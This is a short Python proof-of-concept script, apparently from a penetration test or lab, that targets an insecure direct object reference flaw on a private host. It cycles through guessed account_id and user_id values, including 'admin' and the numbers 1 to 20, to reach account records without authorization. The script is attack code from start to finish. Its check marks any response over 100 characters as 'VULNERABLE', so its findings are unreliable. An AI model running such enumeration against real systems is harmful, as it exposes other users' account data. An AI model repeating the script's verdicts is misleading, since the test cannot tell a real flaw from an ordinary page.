#!/usr/bin/env python3
"""
PoC for IDOR (Insecure Direct Object Reference) on 192.168.64.4
Vulnerability: Account IDs accessible without proper authorization checks
"""
import urllib.request
import urllib.parse
import json

target = "http://192.168.64.4"
id_list = ["0", "001", "1", "2", "3", "admin", "user", "100", "1000"]

print("[+] IDOR PoC - Testing unauthorized access to account resources")
print(f"[*] Target: {target}")
print("-" * 60)

results = []

for acc_id in id_list:
    # Test with account_id parameter
    url = f"{target}?account_id={acc_id}&user_id={acc_id}"
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=5) as response:
            content = response.read().decode('utf-8', errors='ignore')
            if len(content) > 100:
                results.append({"url": url, "status": response.status, "length": len(content)})
                print(f"   [!] VULNERABLE: {url}")
    except Exception:
        pass

print(f"\n[+] Found {len(results)} potentially vulnerable endpoints")
print("-" * 60)

# Test user_id enumeration
print("\n[*] Testing user_id parameter...")
for uid in range(1, 21):
    url = f"{target}?user_id={uid}"
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=3) as response:
            content = response.read().decode('utf-8', errors='ignore')
            if len(content) > 100:
                print(f"   [!] Vulnerable: {url}")
    except Exception:
        pass

print("\n[+] IDOR PoC complete")
